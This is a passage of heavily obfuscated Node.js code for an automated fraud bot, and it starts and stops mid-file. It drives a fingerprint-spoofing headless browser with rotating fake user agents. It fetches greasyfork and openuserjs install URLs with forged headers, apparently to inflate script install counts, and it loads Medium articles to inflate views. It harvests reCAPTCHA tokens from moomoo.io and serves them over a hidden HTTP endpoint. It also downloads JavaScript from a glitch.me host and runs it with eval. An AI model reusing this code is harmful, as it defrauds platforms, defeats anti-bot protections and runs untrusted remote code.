      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + a6(0xb, 'gOiK') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a6(0x9, 'QdP]') + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a6(0x14, 'I0%c') + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a6(0x21, 'BA27') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + a5(0xa) + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + a5(0x1c),
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x198f + 0x1f6b + -0x5dc
  };

function a() {
  const bw = [
    'gJldJYSwW7O0d8k1W5q',
    'house,mr\x20b',
    'W53dRMJdUmkmW4pcOSk2WQpcGa',
    '#search',
    'assign',
    'Ahr0Chm6lY9NCG',
    'y3jPChrZl2j5lq',
    't0HfquXFqw50Aq',
    'ig11C3qTCMv2yq',
    'ESkNjSkyW4pdH8kuWQrijG',
    'r-s-handbo',
    'tvPtW7xcK0RcTLBcTCkS',
    'qCklESoJCcGTcComW5W',
    'WPxdJM3dHtb+W43cGSkOW4m',
    'zyenith',
    'uth-ft-rik',
    'urce=clipb',
    'y3jLyxrLsgfZAa',
    'from',
    'zsb5DgqTCMLJAa',
    'hdVcVqTdA8kxWRG6iW',
    'Bsb2AwrLBY4UlG',
    'ChrZl2j5lxnPDa',
    'y2XPy2S',
    'BJniqLrureHVwa',
    ',\x20like\x20Gec',
    'W5mbumoigH/cTXZdVCkK',
    'uhjVBwLZzq',
    '47ad74c51',
    'oxReal',
    'CgfYzw50lwHLAq',
    'childNodes',
    'WPldIwOpk0pcJmkWt3S',
    'kSocFwz5WQfvreddJa',
    'CxvLCNLtzwXLyW',
    'oSoPW5FcKSkOiSoWWR9UWOu',
    'xGhdV8oSWRnqWOWQW6O8'
  ];
  a = function() {
    return bw;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2026 + -0x24af + 0x107 * 0x43)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xf41 + -0x502 + -0x9db), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x13 * -0x1c1 + 0x695 + 0x1b22), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x133 * 0x1 + -0x13ad + 0x127a;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xf76 * -0x2 + 0x800 + 0x16ec; w < getRandomInt(-0x26d + 0x1d7 * -0x13 + 0x233 * 0x11, 0x191e * -0x1 + -0xca2 + 0x25c5); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x81c5 * 0x1 + -0x1c584 + 0x3019 * 0x11);
        }
      }();
    }, 0x611 * 0x6 + -0x1 * 0x205f + -0x3a3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x98 + -0xe4 * 0x4 + 0x2f8;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xa * 0x1 + 0x139b + 0x1 * -0x1391, -0x1dcf + -0x30e * 0x4 + -0x9 * -0x4b1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xa7e0 * -0x1 + 0x24fa * -0x1 + 0x1420a);
    }, 0x622 * -0x2 + 0x49 * 0x1 + 0xc5f), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xb7f + -0x2628 + 0x31a7;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x51e + -0x233e + 0x1a * 0x19c), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1049 + -0x847 * -0x1 + 0x802), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1 * -0x1082ed + 0x47776 * -0x1 + 0x22b603);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x338 * 0x4 + 0x2594 + -0x3210);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xf * -0x89 + -0x16ed + 0xfae);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2e47 + -0x3c9d + 0x8a74);
}
doFlags['doOUJS'] && ((async () => {
  const ac = d,
    ab = b,
    aa = c;
  async function f() {
    const a9 = c,
      a8 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1325 + -0x3 * 0x1f3 + -0x1 * 0xd4b) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x833 * 0x3 + 0xedb + 0x1 * -0x2773));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x7 * 0x12d + -0x24bc * -0x1 + 0x1c81 * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](-0x61e + 0x45c + 0x1c2, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1 * 0x92a + -0xab * 0x74 + 0x6b62),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object[a8(0x4)](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3455 + -0x1 * -0x27d4 + 0x3391),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + a9(0x8) + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + aa(0x7) + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + ab(0x0, '(H$y') + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ac(0x19) + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x21c1 + -0x160e + -0x5 * 0x257; k < -0x1f0a * 0x1 + -0x5b * -0x10 + 0xcaf * 0x2; k++)
    setTimeout(f, (0x9b52 + -0x145 * -0xa + -0x3e * -0x112) * k * getRandomInt(-0x4e7 * -0x6 + -0xf3 * 0x16 + -0x887, 0x2fe + 0x1c9 + 0x14 * -0x3d));
  setInterval(() => {
    f();
